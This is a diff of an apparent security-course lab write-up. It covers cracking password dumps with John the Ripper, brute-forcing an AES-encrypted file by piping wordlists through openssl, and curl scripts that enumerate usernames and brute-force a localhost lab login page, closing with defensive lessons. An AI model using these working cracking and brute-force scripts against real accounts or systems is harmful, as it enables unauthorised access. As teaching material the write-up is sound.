@@ -1,7 +1,11 @@
 
 ## Part A-  BASIC PASSWORD CRACKING
 
-**Skills to learn**: John the ripper cracking modes 
+**Skills to learn**: 
+
+```diff
++ John the ripper cracking modes (single, wordlist and mangling rules) 
+``` 
 
 Check the files folder inside this directory. It should contain, 
 
@@ -10,7 +14,8 @@ Check the files folder inside this directory. It should contain,
 
 We will use John along with [jumbo patch](http://openwall.info/wiki/john/patches). Every file, namely, easy_dump, medium_dump, hard_dump has 5 users you need to crack
 
-To view passwords already cracked by JTR for a password dump file, one can run the following command: ```~/JohnTheRipper-unstable-jumbo/run/john --show easy_dump```
+To view passwords already cracked by JTR for a password dump file, one can run the following command: 
+``` ~/JohnTheRipper-unstable-jumbo/run/john --show easy_dump```
 
 ### Cracking easy_dump
 
@@ -18,7 +23,9 @@ The following command tells JTR to try “simple” mode, then the default wordl
 
 ```~/JohnTheRipper-unstable-jumbo/run/john easy_dump```
 
-NOTE: ~/JohnTheRipper-unstable-jumbo/run/john is a path to the executable 
+```diff
+- ~/JohnTheRipper-unstable-jumbo/run/john is a path to the executable 
+```
 
 ### Cracking medium_dump
 
@@ -35,7 +42,10 @@ Through this command, I was able to crack rest of the users
 
 This one occupied most of my time. To crack hard users, we will use wordlists with "mangling rules" provided by JTR. 
 
-```~/JohnTheRipper-unstable-jumbo/run/john --rules --wordlist=/home/student/wordlists/YahooVoicePasswords.txt hard_dump```
+```~/JohnTheRipper-unstable-jumbo/run/john --rules --wordlist=/home/student/wordlists/YahooVoicePasswords.txt hard_dump``` 
+
+<br> 
+
 ```~/JohnTheRipper-unstable-jumbo/run/john --rules --wordlist=/home/student/wordlists/RockYouPasswords.txt hard_dump```
 
 However, I was only able to find 4 users with this. For the 5th user, I used ```--rules:single```. This is a hybrid of mangling rules with simple mode. It turned out that 5th user password was in a wordlist but it was flipped. 
@@ -45,7 +55,12 @@ However, I was only able to find 4 users with this. For the 5th user, I used ```
 
 ## Part B - OFFLINE ATTACK 
 
-**Skills to learn**: Bash scripting, openssl utility, Generating passwords from John the ripper to stdout 
+**Skills to learn**: 
+
+```diff 
++ Bash scripting, openssl utility
++ Generating passwords from John the ripper to stdout 
+```
 
 Hacker encrypted the file: secret_file.aes256.txt
 - It was encrypted using AES 256 using the openssl command line tool.
@@ -54,7 +69,7 @@ Hacker encrypted the file: secret_file.aes256.txt
 - The MD5 hash of the hacker's password was used as the password given to openssl for the AES encryption.
 - The contents of the file are Lorem Ipsum in ascii text.
 
-```
+```bash
 rm /home/student/JohnTheRipper-unstable-jumbo/run/john.rec
 
 /home/student/JohnTheRipper-unstable-jumbo/run/john --wordlist=wordlists/YahooVoicePasswords.txt -stdout |
@@ -89,7 +104,7 @@ This is my exploit. Let's break it down to understand it.
 
 ```    output=`openssl enc -d -aes256 -a -k $hash -in secret_file.aes256.txt` ``` -> Try to decrypt using openssl. 
 
-```    
+```bash    
 if [ $? -eq 0 ]; then 
   echo $output | grep -P -n "[\x80-\xFF]"
         if [ $? -eq 0 ]; then
@@ -108,19 +123,27 @@ if [ $? -eq 0 ]; then
 
 ## Part C - ONLINE ATTACK 
 
-**Skills to learn**: curl command line tool, bash scripting, password cracking
+**Skills to learn**: 
+
+```diff
++ curl command line tool
++ bash scripting
++ password cracking
+```
 
 Our goal is to get past the login page of the website below. We would need to find active usernames and crack password for one of the accounts. 
 
-[[Website]]
+![Screenshot](files/website/website.png?raw=true)
+
+### Cracking active usernames 
 
 I tried a random username and I get a following alert:
 
-[[website username not found]]
+![Screenshot](files/website/website-uname-not-found.png?raw=true)
 
 I run the following script to find active usernames: 
 
-```
+```bash
 cat facebook-firstnames.txt | head -n100000 |
   while IFS= read -r uname
   do
@@ -137,19 +160,51 @@ cat facebook-firstnames.txt | head -n100000 |
 
 This script works by making a POST request to the server and if the response contains **"Error. Username does not exist."**, we can skip that username and look for other candidates
 
+### Cracking password for an active user
+
 I tried to login with an active user "adam" with a random password. This is what I got: 
 
-[[website Invalid password.]] 
+![Screenshot](files/website/website-invalid-pass.png?raw=true)
 
 Again, we can modify our existing exploit to search for "Invalid password." string here.
 
+```bash
+wordlist="500-worst-passwords.txt"
 
+cat valid_usernames.txt |
+  while IFS= read -r uname
+  do
+    echo "\n Current user $uname"
+    cat $wordlist |
+    while IFS= read -r passwd
+    do
+    #echo "\n Trying for $uname $passwd"
+    output=`curl --data "username=$uname&password=$passwd" localhost:5000/login 2>/dev/null | grep "Invalid password."`
+    if [ $? -eq 0 ]; then
+        continue
+    else
+        echo "$uname + $passwd" >> "valid_passwords2.txt"
+        echo "$uname + $passwd"
+        break
+    fi
+    done
+  done
+```
 
-**NOTE**: Here, I am not using wordlists from **partA**. Instead, I am using 500-worst-passwords.txt I found on a random Github repo. This is because, users on social media sites are most likely to use bad passwords than linux users.
-
-**SECURITY LESSON:** From this website and exploit, we can safely deduce that one should display same message for wrong usernames and passwords. Otherwise, it is easy for one to enumerate users. One username is enough to find a security weaklink. 
+```diff
+- Here, I am not using wordlists from partA. I am using 500-worst-passwords.txt I found on a random Github repo. 
+- This is because, users on social media sites are most likely to use bad passwords than linux users.
+```
 
 I found the password "123456789" for a user named "michael". We're in ;) 
 
-[[login]]
+![Screenshot](files/website/website-login-success.png?raw=true)
+
+### SECURITY LESSON:
+
+From this website and exploit, we can safely deduce two lessons 
+
+- One should display same message for wrong usernames and passwords. Otherwise, it is easy for one to enumerate users. One username can be enough to find a security weaklink.
+- Websites should have login rate limiting to prevent brute forcing  
+
 
